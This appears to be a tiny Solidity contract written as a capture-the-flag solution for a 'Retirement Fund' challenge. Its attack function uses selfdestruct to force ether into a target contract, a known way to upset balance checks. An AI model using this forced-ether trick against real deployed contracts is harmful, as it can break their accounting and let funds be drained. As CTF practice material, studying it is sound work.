pragma solidity ^0.4.21;

contract CTFRetirementFundChallenge {
    function CTFRetirementFundChallenge () {

    }

    function attack(address _address) {
        selfdestruct(_address);
    }
}
